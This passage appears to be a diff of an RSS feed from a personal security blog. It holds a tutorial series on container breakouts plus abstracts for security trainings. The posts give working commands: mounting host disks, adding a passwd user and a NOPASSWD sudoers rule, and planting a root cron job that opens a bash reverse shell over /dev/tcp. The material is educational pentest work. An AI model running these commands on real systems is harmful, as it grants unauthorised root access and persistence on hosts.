+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        S    14:14   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;kthreadd&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I    14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;kworker/0:0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I&amp;lt;   14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;kworker/0:0H&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I    14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;kworker/u4:0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I&amp;lt;   14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;mm_percpu_wq&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        S    14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ksoftirqd/0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I    14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcu_sched&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root         &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I    14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcu_bh&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root        &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        S    14:14   0:00  &lt;span style=&#34;color:#ae81ff&#34;&gt;\_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;migration/0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can see, the script is executed and the output made available inside the container.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Remark: Thanks to &lt;a href=&#34;https://twitter.com/uchi_mata&#34;&gt;Matthias&lt;/a&gt; for the review and remembering me to add this breakout  technique!&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;host-devices&#34;&gt;Host Devices&lt;/h3&gt;
+&lt;p&gt;If you are in a privileged container, the devices are not striped and namespaced. A quick directory &lt;strong&gt;listing&lt;/strong&gt; of the &lt;strong&gt;devices&lt;/strong&gt; in the container shows that we have &lt;strong&gt;access to all&lt;/strong&gt; of them. Since we are &lt;code&gt;root&lt;/code&gt; and have all capabilities, we can &lt;strong&gt;mount&lt;/strong&gt; the &lt;strong&gt;devices&lt;/strong&gt; that are plugged into the host – as well as the hard drive.&lt;/p&gt;
+&lt;p&gt;Mounting the hard drive is giving us access to the host filesystem.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@0462216e684b:~# ls -l /dev/
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+brw-rw---- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root  &lt;span style=&#34;color:#ae81ff&#34;&gt;994&lt;/span&gt;   8,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 09:20 sda
+brw-rw---- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root  &lt;span style=&#34;color:#ae81ff&#34;&gt;994&lt;/span&gt;   8,   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 09:20 sda1
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+
+~# mkdir /hostfs
+~# mount /dev/sda1 /hostfs
+~# ls -l /hostfs/
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;132&lt;/span&gt;
+lrwxrwxrwx   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root     &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; bin -&amp;gt; usr/bin
+drwxr-xr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 13:29 boot
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;12288&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 10:09 etc
+drwxr-xr-x   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; 14:47 home
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+drwxr-x---   &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 10:09 root
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+lrwxrwxrwx   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root     &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; sbin -&amp;gt; usr/bin
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 14:37 usr
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Escalating the access to the root directory of the host is already described in the &lt;strong&gt;previous part&lt;/strong&gt; of the series &lt;a href=&#34;../container-breakouts-part1&#34;&gt;Part 1: Access to root directory of the Host&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;We have seen three approaches that can be used if a Unix container is started with an insecure configuration.&lt;/p&gt;
+&lt;p&gt;The main take away message is that one should &lt;strong&gt;be careful if&lt;/strong&gt; a &lt;strong&gt;container must&lt;/strong&gt; be &lt;strong&gt;started&lt;/strong&gt; in &lt;strong&gt;privileged&lt;/strong&gt; mode. Ether it is one of the management components that are needed for controlling the container host system or a malicious agenda. &lt;strong&gt;Never start a container privileged if it is not necessary&lt;/strong&gt; and review carefully the additional capabilities that a container might require.&lt;/p&gt;
+&lt;p&gt;Now you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices.&lt;/p&gt;
+&lt;p&gt;If you are interested in how to use the Docker socket to get out of the container, continue with the next post &lt;a href=&#34;../container-breakouts-part3&#34;&gt;Part 3: Docker Socket&lt;/a&gt;.&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Container Breakouts – Part 1: Access to root directory of the Host</title>
+      <link>http://nodyhub.github.io/posts/container-breakouts-part1/</link>
+      <pubDate>Wed, 15 Jul 2020 08:39:10 +0200</pubDate>
+      
+      <guid>http://nodyhub.github.io/posts/container-breakouts-part1/</guid>
+      <description>&lt;p&gt;This post is part of a series and shows container breakout techniques that can be performed if a container is started with access to the host root directory.&lt;/p&gt;
+&lt;p&gt;The following posts are part of the series:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1: Access to root directory of the Host&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;../container-breakouts-part2&#34;&gt;Part 2: Privileged Container&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;../container-breakouts-part3&#34;&gt;Part 3: Docker Socket&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;The &lt;strong&gt;motivation&lt;/strong&gt; of this post is to &lt;strong&gt;collect container breakouts&lt;/strong&gt;. I was considering writing a huge post about all the stuff you must know to break out of the container. But, if I would do so, it will take ages to write, es well to read and at the end, you would just scroll directly to the PoC code snippets. So I dropped that idea and will just link to additional readings.&lt;/p&gt;
+&lt;p&gt;I also realized during writing that the post must be sliced into more digestible pieces.&lt;/p&gt;
+&lt;p&gt;The &lt;strong&gt;first post&lt;/strong&gt; is &lt;strong&gt;about&lt;/strong&gt; what could probably go wrong if the &lt;strong&gt;host root directory&lt;/strong&gt; is &lt;strong&gt;accessible&lt;/strong&gt; from the container. Since we have only access to the disc, this approach is 	not an OpSec-safe approach to escalate your privileges.&lt;/p&gt;
+&lt;p&gt;The proposed techniques use Unix operating system features that are more system security related, then container security-related. But, as part of a comprehensive series, it has to take place to show the importance.&lt;/p&gt;
+&lt;h2 id=&#34;shared-host-root-directory&#34;&gt;Shared Host root directory&lt;/h2&gt;
+&lt;p&gt;Access to a container that shares directories with the host is &lt;strong&gt;not&lt;/strong&gt; an &lt;strong&gt;immediate problem&lt;/strong&gt;. &lt;strong&gt;But&lt;/strong&gt; if the container has &lt;strong&gt;access to&lt;/strong&gt; the &lt;strong&gt;host root directory&lt;/strong&gt; as user &lt;code&gt;root&lt;/code&gt; (pre-assumed that there is no &lt;a href=&#34;https://man.cx/apparmor(7)&#34;&gt;AppArmor&lt;/a&gt; or &lt;a href=&#34;https://man7.org/linux/man-pages/man8/selinux.8.html&#34;&gt;SELinux&lt;/a&gt; in place) you hit the jackpot! We have multiple ways to approach the underlying host.&lt;/p&gt;
+&lt;p&gt;Let’s assume that the host root directory is accessible at &lt;code&gt;/hostfs&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ssh-to-user&#34;&gt;SSH to user&lt;/h3&gt;
+&lt;p&gt;To escalate to the host, we &lt;strong&gt;create a user&lt;/strong&gt; in the file &lt;code&gt;/hostfs/etc/passwd&lt;/code&gt; and &lt;strong&gt;add&lt;/strong&gt; the user &lt;strong&gt;to&lt;/strong&gt; the &lt;strong&gt;sudoer&lt;/strong&gt; group. After the user is created, we connect via &lt;strong&gt;SSH&lt;/strong&gt; to the host. Admittedly, it is a kind of constructed, because certain packages must have been installed and services running, but you get the idea.&lt;/p&gt;
+&lt;p&gt;Here are all steps that must be performed (we start in the container).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# cat /hostfs/etc/passwd | grep &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;
+user:x:1000:1001:user:/home/user:/usr/bin/zsh
+
+~# openssl passwd -6 -salt xyz test
+$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0
+
+~# echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;foo:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:1000:1001:user:/home/user:/usr/bin/zsh&amp;#39;&lt;/span&gt; | tee -a /hostfs/etc/passwd
+
+~# echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user ALL=(ALL) NOPASSWD: ALL&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /hostfs/etc/sudoers.d/0-user
+
+~# ip r
+default via 172.17.0.1 dev eth0 
+172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2 
+
+~# ssh -l foo 172.17.0.1
+The authenticity of host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;172.17.0.1 (172.17.0.1)&amp;#39;&lt;/span&gt; can&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t be established.
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ECDSA key fingerprint is SHA256:PezvADaTYqKcp4JfDO1bapTJaMEAVBjCXCCzanBZOW8.
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Are you sure you want to continue connecting (yes/no)? yes
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;172.17.0.1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; (ECDSA) to the list of known hosts.
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;foo@172.17.0.1&amp;#39;&lt;/span&gt;s password: 
+Last login: Sat Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 12:12:15 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; from 127.0.0.1
+
+arch &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;% sudo -i                  
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;arch ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# id -a&lt;/span&gt;
+uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For this scenario, the SSH daemon is running on the host, the configuration is not hardened and the &lt;code&gt;sudo&lt;/code&gt; package is installed. The sudo step can be exchanged by creating another user with &lt;code&gt;uid=0(root)&lt;/code&gt;. Another option would be the creation of SSH keys for existing users.&lt;/p&gt;
+&lt;h3 id=&#34;cronjob&#34;&gt;Cronjob&lt;/h3&gt;
+&lt;p&gt;Because in a default setup the container is &lt;strong&gt;direct connected to the host&lt;/strong&gt;, we can initiate not only connections from the container to the host, also vice-versa. To do so, we need the IP address from the container. Depending on the binaries that are available on the host, we initiate a &lt;strong&gt;reverse shell by&lt;/strong&gt; a &lt;strong&gt;cronjob&lt;/strong&gt; that connects to an exposed port on the container. In this showcase, we use &lt;code&gt;bash&lt;/code&gt; for the reverse connection and &lt;code&gt;netcat&lt;/code&gt; to handle the connection in the container. The following line is all we need:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;* * * * * root bash -i &amp;gt;&amp;amp; /dev/tcp/$CONTAINER_IP/$CONTAINER_PORT 0&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;strong&gt;cronjob&lt;/strong&gt; is executed &lt;strong&gt;every minute&lt;/strong&gt; as user &lt;code&gt;root&lt;/code&gt; on the host. So, as soon as the cronjob gets trigger, we are getting &lt;strong&gt;root access to&lt;/strong&gt; the &lt;strong&gt;host&lt;/strong&gt; system.&lt;/p&gt;
+&lt;p&gt;Here are all steps that must be performed (we start in the container).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# ip a
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;…&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+6: eth0@if7: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt; qdisc noqueue state UP group default 
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;…&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+
+~# echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;* * * * * root bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.2/1337 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; | tee /hostfs/etc/cron.d/1revers
+~# nc -lkvp &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
+nc -lvkp &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
+listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt; ...
+172.17.0.1: inverse host lookup failed: Unknown host
+connect to &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;172.17.0.2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; from &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;172.17.0.1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58536&lt;/span&gt;
+bash: cannot set terminal process group &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3138&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; device
+bash: no job control in this shell
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;arch ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# id -a&lt;/span&gt;
+uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this second showcase, we assumed that a cron service was running on the host. That is more or less the default on a lot of systems.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Both examples are approaches to get direct access to the host system. They are modifying the host and &lt;strong&gt;not minimal-inversive or OpSec-safe&lt;/strong&gt;. If you &lt;strong&gt;make mistakes&lt;/strong&gt;, you may mix up the configuration of the &lt;strong&gt;host system&lt;/strong&gt; and &lt;strong&gt;crash&lt;/strong&gt; it. &lt;strong&gt;Be careful !!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Furthermore, the proposed techniques are possible approaches to escape out of a container if one has access to the host root directory. By the nature of this attack vector, it is more a general Unix privileges escalation technique, then a dedicated container breakout.&lt;/p&gt;
+&lt;p&gt;I may update the list from time-to-time. If you have important approaches that you think they should be listed, do not hesitate and get in touch.&lt;/p&gt;
+&lt;p&gt;If you are interested in further, less riotous techniques continue with the next post &lt;a href=&#34;../container-breakouts-part2&#34;&gt;Part 2: Privileged Container&lt;/a&gt;.&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Training: Docker, Kubernetes &amp; Security in Enterprise Environments</title>
+      <link>http://nodyhub.github.io/publication/2020-troopers/</link>
+      <pubDate>Fri, 20 Mar 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://nodyhub.github.io/publication/2020-troopers/</guid>
+      <description>&lt;p&gt;Kevin Kelpen &amp;amp; Jan Harrie, TROOPERS20, Heidelberg, Germany&lt;/p&gt;
+&lt;h2 id=&#34;abstract&#34;&gt;Abstract&lt;/h2&gt;
+&lt;p&gt;Container, Microservices, Kubernetes - all of those terms heavily dominate modern application development teams and processes. This training will explain the key technologies behind those terms and focus on the following main questions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How strong and reliable are the isolation capabilities of Docker/Linux/OS containers?&lt;/li&gt;
+&lt;li&gt;How do containers affect typical application and network architectures?&lt;/li&gt;
+&lt;li&gt;How does Kubernetes affect application deployments and workflows?&lt;/li&gt;
+&lt;li&gt;How is “security” integrated into those paradigms?&lt;/li&gt;
+&lt;li&gt;What additional attack surface and security challenges are introduced by the changed development landscape and additional tools?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;All agenda topics will be supported by practical exercises and/or demos. At the end of the training, each attendee will have knowledge about the described buzzwords and tools and understand how they impact application architectures, development, and security posture. Additionally, a fully functional Kubernetes cluster is built, as well as relevant security measures implemented and discussed.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Who should attend this training and why?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;IT Security Professionals who want to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;understand the technology behind the recent and common buzzwords listed above,&lt;/li&gt;
+&lt;li&gt;be able to evaluate the isolation capabilities of container solutions,&lt;/li&gt;
+&lt;li&gt;get ideas on how to integrate security into typical DevOps environments and continuous workflows.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Software Architects and Developers who want to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;learn about potential security vulnerabilities in common practices and tools,&lt;/li&gt;
+&lt;li&gt;understand the concerns of the security people,&lt;/li&gt;
+&lt;li&gt;improve their development chain by adding automated security checks.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Due to the large amount of tools and technologies, this training will not be able to cover security aspects of every single technology in detail. However, we are happy to receive specific questions before the training to potentially prepare additional material and you will get an overview how to approach unknown/new technologies from a security perspective.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Requirements&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The attendees should have:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;intermediate knowledge of the Linux bash and a command line-based text editor (e.g. nano or vim)&lt;/li&gt;
+&lt;li&gt;a system with WLAN and an SSH client (i.e. PuTTY) which is able to connect via SSH to systems in the Internet.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For the exercises, we provide the needed infrastructure in a cloud environment which the attendees can connect to via SSH.&lt;/p&gt;
+&lt;h2 id=&#34;media&#34;&gt;Media&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://insinuator.net/2019/12/troopers20-training-teaser-swim-with-the-whales-docker-devops-security-in-enterprise-environments/&#34;&gt;Blogpost&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    
+    <item>
+      <title>Docker, CI/CD &amp; DevOps Security</title>
+      <link>http://nodyhub.github.io/publication/2019-ish/</link>
+      <pubDate>Wed, 08 May 2019 00:00:00 +0000</pubDate>
+      
+      <guid>http://nodyhub.github.io/publication/2019-ish/</guid>
+      <description>&lt;p&gt;Christoph Klaaßen &amp;amp; Jan Harrie, ISH Summit day, Munich, Germany&lt;/p&gt;
+&lt;h2 id=&#34;content&#34;&gt;Content&lt;/h2&gt;
+&lt;p&gt;Discuss live with participants out of the industry about security aspects of modern and agile software development, -deployment and -operation.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;WHAT TO EXPECT&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Two lectures&lt;/li&gt;
+&lt;li&gt;A case study out of the industry&lt;/li&gt;
+&lt;li&gt;Four round-table discussions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The titles and speakers of the lectures will be announced in a contemporary way.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Agile Software Development &amp;amp;Security&lt;/li&gt;
+&lt;li&gt;Technical security aspects of Docker, Kubernetes and OpenShift&lt;/li&gt;
+&lt;li&gt;Public Cloud Service &amp;amp; Security&lt;/li&gt;
+&lt;li&gt;Governance Challenges in DevOps Environments&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;TARGET AUDIENCE&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The event is suitable for those interested in the field of security in agile software development. Through the case studies and the active discussion rounds you will get to know current problems as well as methods and possibilities, which can be implemented in your everyday life for the safe and modern development of software.&lt;/p&gt;
+&lt;ul&gt;
